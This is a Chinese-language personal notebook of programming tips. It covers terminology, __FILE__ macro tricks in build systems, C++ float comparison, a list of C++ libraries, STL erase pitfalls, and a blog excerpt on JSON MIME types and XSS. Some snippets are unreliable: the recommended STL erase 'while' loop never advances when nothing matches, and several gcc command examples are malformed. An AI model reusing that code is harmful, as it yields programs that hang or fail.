#+title: 一些小技巧

* 计算机术语
** agent, proxy, gatewayn
** 通讯与通信有什么区别
*** 知乎
https://www.zhihu.com/question/19748672

#+BEGIN_EXAMPLE

大陆叫信，短信，电信，通信。
港澳台叫讯，简讯，电讯，通讯。
哪有上面人扯得那么深奥。
#+END_EXAMPLE 


#+BEGIN_EXAMPLE

别太咬文嚼字了，港澳跟内地的叫法区别罢了
我在澳门读的资讯科技学院，内地叫信息技术学院，我的专业通讯工程，内地叫通信工程
通讯（港澳）==通信（内地）；
资讯（港澳）==信息（内地）；
#+END_EXAMPLE


#+BEGIN_EXAMPLE
我也有这个疑惑，举个例子：
中国移动通信集团有限公司，为什么不叫中国移动通讯集团有限公司？
中兴通讯股份有限公司，为什么不叫中兴通信股份有限公司？
所以我觉得 
@小欧
的解释更合理和容易理解一些。


小欧
我只知道自己无知。

通信是人与人之间的信息互通；如：我都很久没跟我那老姨父通过信了。

通讯是设备与环境之间的信号互通；如：我们西部地区的通讯很不发达，常常不在服务区。

怕就怕一个二猛子突然上来再问一个：

「信息」和「信号」之间有什么区别？
擦，这就糗大了。
#+END_EXAMPLE

#+BEGIN_EXAMPLE
 正好约6小时前看到王兴在饭否发了这么一条：
王兴出乎意料，当我想搞明白「通信」和「通讯」这两个词的差别时，给我最满意答案的不是百度知道，也不是各种百科，甚至也不是quora/知乎，而是阿里巴巴论坛里某个帖的第五楼。当然，是通过google找到的。通信与通讯的区别是什么?_商人论坛约 6 小时前 通过 iPhone版

链接的具体解释如下：
王海啸 2007-03-22 22:11  5楼
《现代汉语词典第 5 版说明》强调：“全面正确地执行国家的语言文字规范和科技术语规范是本书的重要原则。”新版《现代汉语词典》在“通信”“通讯”等词条的处理上，体现了执行科技术语规范的编写原则。

旧版《现汉》(《现代汉语词典》第 3 版、第 4 版) “通信”“通讯”词条的释义：
【通信】用书信互通消息, 反映情况等：～处|我们几年前曾经通过信。
【通信】利用电波、光波等信号传送文字、图像等：数字～通讯
【通讯】①利用电讯设备传递消息:～班|无线电～。②详实而生动地报道客观事物或典型人物的文章。

新版《现汉》(《现代汉语词典》第 5 版) “通信”“通讯”词条的释义：
【通信】①用书信互通消息, 反映情况等：～处|我们几年前曾经通过信。②利用电波、光波等信号传送文字、图像等。根据信号方式的不同, 可分为模拟通信和数字通信。旧称通讯。
【通讯】①通信②的旧称。②翔实而生动地报道客观事物或典型人物的文章。

经比较可看出，《现代汉语词典》第 5 版作了如下调整：
1.将旧版《现汉》的两个【通信】词条合为一个词条，并在义项②的释义中增加了“根据信号方式的不同，可分为模拟通信和数字通信。旧称通讯”的说明。
2.将旧版《现汉》的【通讯】词条的义项①“利用电讯设备传递消息:～班|无线电～”删去，改为“通信②的旧称”。
这样的调整，是为了说明“通信”与“通讯”各有分工，语义不同，不再通用。
在“利用电波、光波等信号传送文字、图像等”这一意义上，须用“通信”，而不用“通讯”。与之相关的词语有“通信兵”“通信卫星”“通信工程” “通信技术” “通信系统”“无线电通信”等。
“通讯”则只用于与新闻报道相关的词语，如“通讯社”“通讯网”“通讯员”等。
此外，与“通信”和“通讯”相应，“电信”和“电讯”也有分工：“电信”指“利用电话、电报或无线电设备等传送信息的通信方式”，不写作“电讯”；“电讯”指“用电话、电报或无线电设备等传播的消息”，不写作“电信”。

王海啸 2007-03-22 22:11 6楼
通讯和通信的区别：
1、二者强调的重点不同
通信强调的是结果，其结果是使交流的各方清楚某事，而通讯强调的是过程，怎样去传递。比如说到移动通讯，表示那是一项技术，而移动通信，表示的是一项服务，因此，中国移动取名为“中国移动通信”，表示他是帮助人们沟通的，如果改成“中国移动通讯”，那就成了和中兴、华为等一样的提供技术的公司。
2、二者对接收者的有用性不同
内容在通信和通讯的时候都是有载体的，可能是实体符号或者调制信号。通信的时候，通信的接收方一定很清楚怎样从内容里得到传递的信息，而通讯则不是。比如A、B、C和D在同一个communication域里，A往外发信号，B、C和D都能收到，此时我们说A和C在通讯，A和D在通讯，A和B在通讯。可能A只想把内容传送给B而不想让C和D知道，他会把内容加密，而把密钥只交给B，此时B就可以根据密钥拿到A想传递的内容，而C和D就不行，此时我们可以说A和B在通信，而A和C、A和D仍然只是在通讯。
作为一名厌恶论坛的人，最好的东西都在论坛BBS里是反人类的。
#+END_EXAMPLE
*** baidu文库
https://wenku.baidu.com/view/61bb06b465ce0508763213c0.html

#+BEGIN_EXAMPLE

通讯和通信的区别：

1、二者强调的重点不同

通信强调的是结果，其结果是使交流的各方清楚某事，而通讯强调的是过程，怎样去传递。比如说到移动通讯，表示那是一项技术，而移动通信，表示的是一项服务，因此，中国移动取名为“中国移动通信”，表示他是帮助人们沟通的，如果改成“中国移动通讯”，那就成了和中兴、华为等一样的提供技术的公司。

2、二者对接收者的有用性不同

内容在通信和通讯的时候都是有载体的，可能是实体符号或者调制信号。通信的时候，通信的接收方一定很清楚怎样从内容里得到传递的信息，而通讯则不是。比如A、B、C和D在同一个communication域里，A往外发信号，B、C和D都能收到，此时我们说A和C在通讯，A和D在通讯，A和B在通讯。可能A只想把内容传送给B而不想让C和D知道，他会把内容加密，而把密钥只交给B，此时B就可以根据密钥拿到A想传递的内容，而C和D就不行，此时我们可以说A和B在通信，而A和C、A和D仍然只是在通讯。

通信和通讯有什么区别?

1． 通讯和通信

目前，这两个词的使用频率相当高，但词义范围如何界定，并未明确统一。

传统意义上的“通讯”主要指电话、电报、电传。通讯的“讯”指消息（Message）,媒体讯息通过通讯网络从一端传递到另外一端。媒体讯息的内容主要是话音、文字、图片和视频图像。其网络的构成主要由电子设备系统和无线电系统构成，传输和处理的信号是模拟的。所以，“通讯”一词应特指采用电报、电话等媒体传输系统实现上述媒体信息传输的过程。

“通信”仅指数据通信，即通过计算机网络系统和数据通信系统实现数据的端到端传输。通信的“信”指的是信息（Information）,信息的载体是二进制的数据。数据则是可以用来表达传统媒体形式的信息，如声音、图像、动画等。

由于旧的“通讯”系统早已实现了数字化、计算机网络化改造，因此可以认为目前的数据通信系统已涵盖了过去的“通讯”系统的功能。按照这个结论，目前应多使用“通信”一词表达互联网间与局域网内的数据传输，尽量少用或不用“通讯”一词，以免引起概念上的误解。

2． 节点和结点，互联和互连

在技术文章中经常能见到“网络节点”和“网络结点”，还有“互联”和“互连”的提法，它们之间有明确的界定吗？其实，这是个纯粹的语文问题，与技术无关。即使出现了混用，也不至于产生歧义，所以这些词不做任何区分，都可以使用。

3． 协议和标准

网上有不同的协议或标准，“协议”和“标准”的概念相似，但又有所区别。协议（Protocol）是分层

的，就低层而言指通信的各方共同遵守的约定；就高层而言，是对网络应用、管理方面的约定。所以协议的本质就是约定，而且是正式的约定，如IP就是OSI/RM的第三层协议。

而标准的范围更广，它不仅包括已经成文的约定,也包含网络上所有统一执行的规则。所以有时把标准称为规范或规则。比如，IEEE 802.3u是电气电子工程师协会制定的快速以太网标准，同时也可以认为它是100M以太网的一大类协议集；Category (CAT3 、CAT5)是EIA/TIA两个组织为非屏蔽双绞线制定的线类标准，它只能被称为标准，不能叫做协议。

二、同一词语有不同的含义

1．带宽

在网络技术中，不同的应用场合,“带宽”有不同的含义。一种指网络的频率带宽—频带宽度，即网络信号的最大频率与最小频率之差，单位是赫兹;另一种则指局域网的最大传输速率，代表了LAN的数据传输能力，单位是bps。

2．速率

“通信速率”通常分为两种:一种是单位时间内传输的比特数，也叫比特速率、数据传输速率、数据率或简称速率;另一种是单位时间内传输的码元数，也叫码元速率、调制速率、波特速率或简称波特率（Baud Rate）。比特速率值可以和波特速率值相同，也可以不同。例如，对Modem而言,它在运行中的比特速率值远大于波特速率值。

3．媒体

“媒体”(Media)是经常出现的一个词汇，可以理解成用来连结两个或多个事物的中介物，在不同应用场合也被称为传媒、媒介、介质、界面等，但意义都有所不同。

当用于公众信息传播领域，“媒体”称为传媒，像广播、电视、报刊、杂志、网站等，都属于传媒。

当用于计算机信息处理技术上，“媒体”被称为媒体信息。通常指语音、文字、图形图像、动画等多种媒体，即多媒体。

当用于网络和通信技术，则被称为媒体介质、通信媒体、传输介质。我们所熟知的电缆、光缆、无线电、微波等，就属于这一类。

此外，在软件应用领域，把通过显示器向用户输出的那部分媒体信息称为软件的用户界面（UI）。 


#+END_EXAMPLE

** build system

* 代替__FILE__宏只显示文件名
  [[https://stackoverflow.com/questions/8487986/file-macro-shows-full-path][参考]]

  在默认的情况下，__FILE__ 被替换成文件的完整路径名，
  如
#+BEGIN_SRC 
    gcc -o app/src/module/proxy.c
#+END_SRC

    __FILE__ 值为 app/src/module/proxy.c
 
  但如果在module目录下执行
#+BEGIN_SRC 
    gcc -o proxy.c
#+END_SRC
    __FILE__ 值为 proxy.c

    在cmake ,scons等编译系统下，log长度就会很长，而我们只希望保留文件名即可

** 在运行时去掉

#+BEGIN_SRC 
#define __FILENAME__ (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)
#+END_SRC


在使用时就用__FILENAME__代替__FILE__

** 在预编译去掉 
*** 在makefile中

自己写的例子

c文件

#+BEGIN_SRC  c

#define BASIC_TRACE(level, format, ...)                                  \
    do{                                                                 \
        if(level <= 5){                                      \
            printf("%s(%d): "format"\n", __FILENAME__, __LINE__, ##__VA_ARGS__); \
        }                                                               \
    }while(0)




#include <stdio.h>
#include <string.h>

void main(void){

    BASIC_TRACE(1, "etette");
}


#+END_SRC


makefile 

#+BEGIN_SRC makefile

all: test
clean:
	rm -f test.o test

test : test.c
	gcc $< -D__FILENAME__=\"$(notdir $<)\" -o $@

#+END_SRC



进一步可以放在CFLAGS里

#+BEGIN_SRC makefile
all: test

clean:
	rm -f test.o test

CFLAGS = -D__FILENAME__=\"$(notdir $(abspath $<))\"
#CFLAGS = -D__FILENAME__=\"$(notdir $<)\"

test : test.c
	gcc $< ${CFLAGS} -o $@
#+END_SRC


这里用到了make的notdir函数，作用是去掉路径部分.
abspath不是必须的，只是为了说明notdir函数
*** 在scons中
scons中可以设置编译的命令行，$CCCOM,
以在rt-thread项目为例，
在bsp/stm32f20x/SConstruct文件中，

#+BEGIN_SRC python
if rtconfig.PLATFORM == 'gcc':
   	env.Replace(CCCOM = ['basename $SOURCES | xargs -i{} $CC -o $TARGET -c -D__FILENAME__=\\\"{}\\\" $CFLAGS $CCFLAGS $_CCCOMCOM $SOURCES'])
#+END_SRC

先用basename 命令去除多余部分，然后传给$CC， 定义一个宏。
注意这是用的是两次转义操作，因为要在python和bash各转一次。

*** cmake
If you are using CMAKE with GNU compiler this global define works fine
#+BEGIN_SRC 
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -D__MY_FILE__='\"$(notdir $(abspath $<))\"'")
#+END_SRC

* debug shared library on linux
  现象：
     动态库更改后，马上运行执行程序，更改的动态库不会加载，
     估计是系统为了加快程序启动，没有删除原来的动态库，当发现原来的动态库文件还在，就用缓存中的动态库文件了。
  - 先把library 删除
  - 再把执行程序执行一次，报错，这时系统会把动态库删除
  - 再次生成动态库，库能正确加载

* xsde 调试经验
  - 用内存区域调用解析接口时，不要包含字符结尾 '0'
如
#+BEGIN_SRC c++
unsigned char net_element[] = R"(<railML>
    <functionalInfrastructure> <!--功能设施 -->
      <tracks>  <!--轨道定义 -->
      </tracks>
      <speeds>  <!--速度表 -->
      </speeds>
      <signals> <!--校正点 -->
      </signals>
    </functionalInfrastructure>        
  </infrastructure>
</rail>)";
    Rail rail;
    int rc = rail.ReadXml(net_element, sizeof(net_element) - 1);

#+END_SRC

长度是sizeof(net_element) - 1)时， 运行正确，而改成

#+BEGIN_EXAMPLE
sizeof(net_element)
#+END_EXAMPLE

时，运行时会出现如下错误

#+BEGIN_EXAMPLE
not well-formed (invalid token)
#+END_EXAMPLE

* zeroconf
  http://www.zeroconf.org/
* c++ 
** c++中小数的比较

 使用c++标准函数
 | 函数名              | 代替 |
 | isgreater(a,b)      | >    |
 | isless(a,b)         | <    |
 | isgreaterequal(a,b) | >=   |
 | islessequal(a,b)    | <=   |
 | islessgreater(a,b)  | !=   |

  **在catch里测试 islessgreater 不起作用， 所以不用这个函数作相等判断情况.**

 #+BEGIN_SRC c++
 isgreater(a,b)
 isless(a,b)
 isgreaterequal(a,b)
 islessequal(a,b)
 islessgreater(a,b)

 a,b可以为float, double, long double类型

 #+END_SRC

 http://www.cplusplus.com/reference/limits/numeric_limits/
 #+BEGIN_SRC c++ 
 std::numeric_limits<double>::epsilon()
 #+END_SRC

*** https://stackoverflow.com/questions/17333/what-is-the-most-effective-way-for-float-and-double-comparison


 #+BEGIN_VERSE

 Be extremely careful using any of the other suggestions. It all depends on context.

 I have spent a long time tracing a bugs in a system that presumed a==b if |a-b|<epsilon. The underlying problems were:

     The implicit presumption in an algorithm that if a==b and b==c then a==c.

     Using the same epsilon for lines measured in inches and lines measured in mils (.001 inch). That is a==b but 1000a!=1000b. (This is why AlmostEqual2sComplement asks for the epsilon or max ULPS).

     The use of the same epsilon for both the cosine of angles and the length of lines!

     Using such a compare function to sort items in a collection. (In this case using the builtin C++ operator == for doubles produced correct results.)

 Like I said: it all depends on context and the expected size of a and b.

 BTW, std::numeric_limits<double>::epsilon() is the "machine epsilon". It is the difference between 1.0 and the next value representable by a double. I guess that it could be used in the compare function but only if the expected values are less than 1. (This is in response to @cdv's answer...)

 Also, if you basically have int arithmetic in doubles (here we use doubles to hold int values in certain cases) your arithmetic will be correct. For example 4.0/2.0 will be the same as 1.0+1.0. This is as long as you do not do things that result in fractions (4.0/3.0) or do not go outside of the size of an int

 #+END_VERSE


 #+BEGIN_VERSE



 Comparing floating point numbers for depends on the context. Since even changing the order of operations can produce different results, it is important to know how "equal" you want the numbers to be.

 Comparing floating point numbers by Bruce Dawson is a good place to start when looking at floating point comparison.

 The following definitions are from The art of computer programming by Knuth:

 bool approximatelyEqual(float a, float b, float epsilon)
 {
     return fabs(a - b) <= ( (fabs(a) < fabs(b) ? fabs(b) : fabs(a)) * epsilon);
 }

 bool essentiallyEqual(float a, float b, float epsilon)
 {
     return fabs(a - b) <= ( (fabs(a) > fabs(b) ? fabs(b) : fabs(a)) * epsilon);
 }

 bool definitelyGreaterThan(float a, float b, float epsilon)
 {
     return (a - b) > ( (fabs(a) < fabs(b) ? fabs(b) : fabs(a)) * epsilon);
 }

 bool definitelyLessThan(float a, float b, float epsilon)
 {
     return (b - a) > ( (fabs(a) < fabs(b) ? fabs(b) : fabs(a)) * epsilon);
 }

 Of course, choosing epsilon depends on the context, and determines how equal you want the numbers to be.

 Another method of comparing floating point numbers is to look at the ULP (units in last place) of the numbers. While not dealing specifically with comparisons, the paper What every computer scientist should know about floating point numbers is a good resource for understanding how floating point works and what the pitfalls are, including what ULP is.


 #+END_VERSE



*** 

 #+BEGIN_SRC c++ 
 // Test whether two float or double numbers are equal.
 // ulp: units in the last place.
 template <typename T>
 typename std::enable_if<!std::numeric_limits<T>::is_integer, bool>::type
 IsAlmostEqual(T x, T y, int ulp = 2)
 {
     // the machine epsilon has to be scaled to the magnitude of the values used
     // and multiplied by the desired precision in ULPs (units in the last place)
     return std::fabs(x - y) < std::numeric_limits<T>::epsilon() * std::fabs(x + y) * ulp
            // unless the result is subnormal
            || std::fabs(x - y) < std::numeric_limits<T>::min();
 }

 #+END_SRC
** c++ lib 
*** 
 http://en.cppreference.com/w/cpp/links/libs

 A list of open source C++ libraries
 < cpp‎ | links

 The objective of this page is to build a comprehensive list of open source C++ libraries, so that when one needs an implementation of particular functionality, one needn't to waste time searching on Google.

 If you know a library that might be useful to others, please add a link to it here. There are no restrictions on what can be included except that the source of the library must be readily available to download.

 The page is provided 'as is' - with the hope of being useful, but without any warranties. Outdated, misleading or wrong links might appear here. If you've noticed one of these, it would be great if you fixed the error.
 Generic

     Boost -  large collection of generic libraries (Boost License)
     BDE -  The BDE Development Environment from Bloomberg L.P. (Apache License)
     Dlib -  networking, threads, graphical interfaces, data structures, linear algebra, machine learning, XML and text parsing, numerical optimization, Bayesian nets, and numerous other tasks (Boost License)
     JUCE -  An extensive, mature, cross-platform C++ toolkit (GPL License)
     Loki -  design patterns
     Reason -  xml, xpath, regex, threads, sockets, http, sql, date-time, streams, encoding and decoding, filesystem, compression (GPL License)
     Yomm11 -  Open multi-methods for C++11 (Boost License)
     Folly -  Facebook Open-source LibrarY. Library of C++11 components designed with practicality and efficiency in mind.
     cxxomfort - Backports of C++ features (C++11 to C++03 and C++1y proposals to C++11/C++03).
     libsourcey -  Cross-platform C++11 library for high speed networking and media encoding. HTTP, WebSockets, TURN, STUN, Symple and more...
     OnPosix -  C++ library providing several abstractions (e.g., threading, networking, logging, IPC, etc.) on POSIX platforms.
     Ultimate++ -  Cross-platform rapid application development framework
     CAF - The C++ Actor Framework (CAF) is an open source C++11 actor model implementation featuring lightweight & fast actor implementations, pattern matching for messages, network transparent messaging, and more (BSD License).
     wdl-AmirFJ - a modified version of WDL-OL with some improvements.
     cpp-mmf - A C++98 library that encapsulates memory-mapped-files for POSIX or Windows
     CommonPP - Multi-purpose library with a strong emphasis on getting metrics out of a project. (BSD)
     Better Enums - Reflective enums (enum to string, iteration, etc.) with constexpr support. (BSD)
     Smart Enum - "to_string", "from_string" and more for your enums. (Boost License)
     nytl - C++11 header-only template library for maths, functions (callbacks) and general utility.
     SaferCPlusPlus -  SaferCPlusPlus - Safe compatible substitutes for unsafe C++ primitives, including pointers, int and std::vector. (Boost License) 

 Communication

     C++ RESTful framework -  C++ micro-framework designed to be embedded into a wide range of applications.
     C++ REST SDK - asynchronous HTTP client and listener, asynchronous Stream, URI, JSON
     cpr - a modern C++ HTTP requests library
     cpp-netlib - cpp-netlib: The C++ Network Library
     Boost.Asio - asynchronous and synchronous networking, timers, serial I/O
     gsoap -  C/C++ development toolkit for XML data bindings, fast WSDL/SOAP/XML Web services, WS-Security, JSON/XML-RPC RESTful services
     POCO -  networking: encryption, HTTP; Zip files
     ACE -  asynchronous networking, event demultiplexing, messaging, CORBA
     wvstreams
     Unicomm -  asynchronous networking, high-level TCP communication framework
     restful_mapper - ORM for consuming RESTful JSON APIs in C++
     zeromq -  fast message queue
     curlpp -  C++ wrapper for CURL library
     Apache Thrift -  The Apache Thrift software framework, for scalable cross-language services development, combines a software stack with a code generation engine to build services that work efficiently and seamlessly between C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, OCaml and Delphi and other languages.
     libashttp -  asynchronous HTTP client library
     Simple C++ REST library -  Very simple and self documenting library for creating a REST API in your c++ application
     libtins - Network packet crafting and sniffing library
     HTTPP - Simple, production ready HTTP server built on top of Boost and a client built on top of libcurl. (BSD) 

 Graphic user interface

     FLTK
     nana[doc] - GUI programming in modern C++ style (Boost License)
     WxWidgets[src][doc]
     OWLNext - Modern update to OWL for writing GUI applications in standard C++ on Windows
     tiny file dialogs -  a single C C++ cross-platform file (no init, no main loop, 6 modal function calls) 

 GTK+

     glibmm
     gtkmm
     goocanvasmm
     libglademm
     libgnomecanvasmm
     webkitgtk
     flowcanvas
     evince 

 Qt

     Qt[src][doc]
     qwtplot3d
     qwt5
     libdbusmenu-qt 

 General Multimedia

     SFML (Simple and Fast Multimedia Library)
     SDL (Simple DirectMedia Layer) -  cross-platform, low level access to audio, keyboard, mouse, joystick, and graphics hardware via OpenGL and Direct3D (zlib license)
     Cinder
     openFrameworks 

 Graphics

     cairomm
     nux
     pangomm
     gegl
     stb 

 Plotting

     plotutils 

 Formats

     libraw
     openexr
     qimageblitz
     imagemagick
     djvulibre
     poppler
     SVG++ 

 Audio

     soundtouch 

 Fingerprinting

     chromaprint
     libofa
     libmusicbrainz 

 Formats

     audiofile
     flac 

 Tagging

     id3lib
     taglib 

 CD

     libkcompactdisc 

 Image Processing

     opencv 

 Video

     crystalhd
     mjpegtools
     libmatroska
     libVLC
     gstreamermm 

 3D Graphics

     bgfx Cross-platform, graphics API agnostic, "Bring Your Own Engine/Framework" style rendering library.
     Ogre3D
     OpenGL
     GLEW OpenGL function loading
     GLFW OpenGL window manager
     GLM Header only C++ mathematics library for rendering
     assimp 3D model loading
     VTK
     Magnum C++11 and OpenGL/GLES/WebGL graphics engine
     Irrlicht
     Horde3D 


 Game Engine Architecture

     EntityX
     Anax 


 Internationalization

     IBM ICU
     gettext 

 Math

     alglib
     ArrayFire High Performance Computation Library
     GNU MP bignum C++ interface
     Boost.Multiprecision
     Boost.Math.Special Functions and Statistical Distributions
     Boost.Random
     NTL - A Library for doing Number Theory
     cpp-measures - A header-only C++11 library to handle physical measures
     G+Smo cross-platform library for isogeometric analysis 

 Linear algebra

     Boost.uBLAS
     Eigen
     Armadillo
     Blitz++
     IT++
     Dlib - linear algebra tools 

 Graph theory

     Boost.Graph
     LEMON
     OGDF - Open Graph Drawing Framework
     NGraph - a simple (Network) Graph library in C++ 

 Class Library for Numbers

     cln 

 Machine Learning

     liblinear
     Dlib - machine learning tools
     MLPACK - machine learning package
     Shogun - large scale machine learning toolbox 

 Computational geometry

     CGAL - Computational geometry algorithms library
     Wykobi - Computational geometry library
     PCL - Point Cloud library 

 Financial Calculations

     QuantLib - Quantitative finance library 

 Concurrency

     Intel TBB
     OpenMP
     RaftLib C++ stream like concurrent actors
     Thrust STL-like algorithms and data-structures for CUDA
     ViennaCL Linear algebra and algorithms with OpenMP, CUDA, and OpenCL backends
     VexCL C++ expression templates library for OpenCL and CUDA
     Boost.Compute (unofficial) STL-like algorithms and data-structures for OpenCL
     Boost.Interprocess
     Boost.Thread
     Boost.Atomic
     Boost.Lockfree
     Boost.MPI
     Boost.Context
     libopenmpi
     libsimdpp
     HPX A general purpose C++ runtime system for parallel and distributed applications of any scale
     SObjectizer A small framework for simplification of development of concurrent and event-driven applications in C++ by using actor and publish-subscribe models. 

 Containers

     Boost.Any
     Boost.Array
     Boost.Bimap
     Boost.Container
     Boost.Fusion
     Boost.Heap
     Boost.Pointer Container
     Boost.Tuple
     Boost.Variant
     cpp-btree -  btree_map, btree_set, btree_multimap, btree_multiset. 

 Serialization

     Boost.Serialization
     libs11n
     sweet_persist
     protobuf
     gSOAP
     C++ XML objects
     yaml-cpp
     YAS (Yet Another Serialization)
     cereal (C++11 serialization) 

 Testing

     Boost.Test
     cppunit
     Google Test
     Catch
     jest - A sane and minimal C++14 unit test framework 

 Benchmarking

     Celero 

 XML

     libxml++
     pugixml
     tinyxml
     tinyxml2 - Another and work in progress of TinyXML.
     Xerces 

 JSON

     jsonme--
     ThorsSerializer
     JsonBox
     jsoncpp
     zoolib
     JOST
     CAJUN
     libjson
     nosjob
     rapidjson
     jsoncons -  jsoncons is a C++ library for the construction of tree structured json values. It also supports an event-based streaming API.
     JSON++
     qjson
     json-cpp
     jansson -  Jansson is C library for encoding, decoding and manipulating JSON data.
     json11 -  json11 is a tiny JSON library for C++11, providing JSON parsing and serialization.
     JSON Voorhees - Killer JSON for C++
     jeayeson - A very sane (header only) C++14 JSON library
     ujson - µjson is a small, C++11, UTF-8, JSON library
     minijson - C++ DOM-less and allocation-free JSON parsing and serialization 

 Web

     libNavajo -  light and powerful http server for web application development (LGPL License)
     libmusicbrainz5
     liblastfm
     libkcddb
     Chromium Embedded
     Wt[src][doc] 

 GPS

     gpsd 

 Databases

     DTL
     libpqxx
     lmdb++ -  C++11 wrapper for the LMDB embedded B+ tree database library.
     mysql++
     ODB - C++ Object-Relational Mapping (ORM)
     QUINCE: QUeries IN C++ Expressions (ORM+EDSL)
     QxOrm - C++ Qt Object-Relational Mapping (ORM)
     SOCI
     sqlpp11 

 Cryptography

     Botan
     gnutls
     openssl
     crypto++
     TomCrypt 

 File metadata

     libkexiv2
     exiv2
     exempi
     rarian 

 Text

 Parse

     PEGTL -  Parsing Expression Grammar Template Library 

 Search

     clucene
     xapian 

 Terminal

     cwidget 

 Configuration

     gconfmm
     libconfig
     Boost.Program_options 

 Embedded languages bindings

     ChaiScript
     ExprTk
     lua
     AngelScript - a scripting language like C++.
     mozjs
     muparser
     PythonQt 

 Embedded/realtime

     QP/C++ -  RTOS kernel, dual GPL
     FreeRTOS C++ Handler -  handler, looper, state machine, CLI, portable
     ETL - Embedded Template Library -  C++ 03, Portable template library tailored for low resource platforms 

 PDF

     HARU
     PoDoFo
     JagPDF 

 Logging

     Log4cpp - A library of C++ classes for flexible logging to files, syslog, IDSA and other destinations (LGPL)
     spdlog - Super fast, header only, C++ logging library
     plog - Portable and simple log for C++ in less than 1000 lines of code (MPL2) 
*** 目前感兴趣的库

  - ACE
  - zeromq
  - zeroc:  
    https://zeroc.com/
  - apache thrift
  - libtins (libpcap, dpkt, impacket, scapy, libcrafter)
    packet crafting and sniffing library
    libpcap最快


*** cgi/fcgi
    - cgicc
    - fastcgi++
    - kcgi
    - qdecoder
** c++ reference
 https://en.wikipedia.org/wiki/Reference_(C%2B%2B)

    - Relationship to pointers
      - It is not possible to refer directly to a reference object after it is defined; any occurrence of its name refers directly to the object it references.
      - Once a reference is created, it cannot be later made to reference another object; it cannot be reseated. This is often done with pointers.
      - References cannot be null, whereas pointers can; every reference refers to some object, although it may or may not be valid. Note that for this reason, containers of references are not allowed.
      - References cannot be uninitialized. Because it is impossible to reinitialize a reference, they must be initialized as soon as they are created. In particular, local and global variables must be initialized where they are defined, and references which are data members of class instances must be initialized in the initializer list of the class's constructor. For example: 
     

*** c++ reference 
 https://isocpp.org/wiki/faq/references

   - Use references when you can, and pointers when you have to.

   - What does it mean that a reference must refer to an object, not a dereferenced null pointer?


** c++11

*** New string literals
 #+BEGIN_EXAMPLE




 C++11 supports three Unicode encodings: UTF-8, UTF-16, and UTF-32. Along with the formerly noted changes to the definition of char, C++11 adds two new character types: char16_t and char32_t. These are designed to store UTF-16 and UTF-32 respectively.

 Creating string literals for each of these encodings can be done thusly:

 u8"I'm a UTF-8 string."
 u"This is a UTF-16 string."
 U"This is a UTF-32 string."

 The type of the first string is the usual const char[]. The type of the second string is const char16_t[] (note lower case 'u' prefix). The type of the third string is const char32_t[] (upper case 'U' prefix).

 When building Unicode string literals, it is often useful to insert Unicode code points directly into the string. To do this, C++11 allows this syntax:

 u8"This is a Unicode Character: \u2018."
 u"This is a bigger Unicode Character: \u2018."
 U"This is a Unicode Character: \U00002018."

 The number after the \u is a hexadecimal number; it does not need the usual 0x prefix. The identifier \u represents a 16-bit Unicode code point; to enter a 32-bit code point, use \U and a 32-bit hexadecimal number. Only valid Unicode code points can be entered. For example, code points on the range U+D800–U+DFFF are forbidden, as they are reserved for surrogate pairs in UTF-16 encodings.

 It is also sometimes useful to avoid escaping strings manually, particularly for using literals of XML files, scripting languages, or regular expressions. C++11 provides a raw string literal:

 R"(The String Data \ Stuff " )"
 R"delimiter(The String Data \ Stuff " )delimiter"

 In the first case, everything between the "( and the )" is part of the string. The " and \ characters do not need to be escaped. In the second case, the "delimiter( starts the string, and it ends only when )delimiter" is reached. The string delimiter can be any string up to 16 characters in length, including the empty string. This string cannot contain spaces, control characters, (, ), or the \ character. Using this delimiter string allows the user to have ) characters within raw string literals. For example, R"delimiter((a-z))delimiter" is equivalent to "(a-z)".[4]

 Raw string literals can be combined with the wide literal or any of the Unicode literal prefixes:

 u8R"XXX(I'm a "raw UTF-8" string.)XXX"
 uR"*(This is a "raw UTF-16" string.)*"
 UR"(This is a "raw UTF-32" string.)"

 #+END_EXAMPLE

** stl 删除操作
   由于stl(map, set)内部的存储结构不是线性的,　所以删除时不能用++it这种操作
  
      for(it = enter_faults_.begin(); it != enter_faults_.end(); ++it){

              enter_faults_.erase(it);
                
         }

 这种操作因为删除后的内部结构重整,　++it已经不是原来的了,　会crash
 
  list的操作erase会返回下一个单元的iterator,　但是在for要按照下面的写法
       for(it = enter_faults_.begin(); it != enter_faults_.end();){
             if(it->id.ToInt() == id.ToInt() && it->sub_type == sub_type){
                 it = enter_faults_.erase(it);
             }else{
                ++it; 
             }
         }
        
 把++操作移出来,　因为如果删除的是最后一个单元时,　再执行++就会crash

   还是最好写成while 形式

 #+BEGIN_SRC cpp
     it = enter_faults_.begin();
     while(it != enter_faults_.end()){
             if(it->id.ToInt() == id.ToInt() && it->sub_type == sub_type){
                 enter_faults_.erase(it);
                it = enter_faults_.begin();               
             }
    }
  
 #+END_SRC  
** c++ ORM
*** 
  http://www.codesynthesis.com/products/odb/
*** 
  http://quince-lib.com/index.html

* linux 
** proc/net/udp

 Holds a dump of the UDP socket table. Much of the information is not of use apart from debugging. The "sl" value is the kernel hash slot for the socket, the "local_address" is the local address and port number pair. The "rem_address" is the remote address and port number pair (if connected). "St" is the internal status of the socket. The "tx_queue" and "rx_queue" are the outgoing and incoming data queue in terms of kernel memory usage. The "tr", "tm->when", and "rexmits" fields are not used by UDP. The "uid" field holds the effective UID of the creator of the socket.

 Also see http://stackoverflow.com/a/18322579/449347

 /proc/net/snmp

 This file holds the ASCII data needed for the IP, ICMP, TCP, and UDP management information bases for an SNMP agent.

 From http://linux.die.net/man/5/proc


* json MIME
*** json MIME
   - Why you shouldn't use text/html for JSON
   http://jibbering.com/blog/?p=514

#+BEGIN_EXAMPLE

Don't serve JSON as text/html
Another day, another XSS flaw, this one in Google again, but this is a little more interesting than the normal ones, what this one shows is how JSON results add an extra vector to attack that might be missed by your QA team. The problem here was that the JSON was returned with a mime-type of text/html, a browser will render that as if it was an HTML page, even if it's really just a javascript snippet. The easiest way to protect against these is to ensure that all javascript recieved by the XMLHTTPRequest object is returned with a suitable mime-type - application/json That will mean even when you make a mistake and write un-encoded untrusted data to the document, it won't allow people to attack your site. The google exploit was reported here, it's at the time of writing unpatched, unfortunately that was down to the discoverer not giving google any time to fix, whilst they have had their problems before, recently they have patched quickly, so this was not very fair, or wise. Google also appear to be taking testing their own services for security flaws more seriously, they recently had a presentation to the QA team that you can watch on Google Video. As I've said before, the everything on a single domain causes problems, it means any exploit anywhere on the domain, allows you to exploit any service provided for the domain. This exploit is also 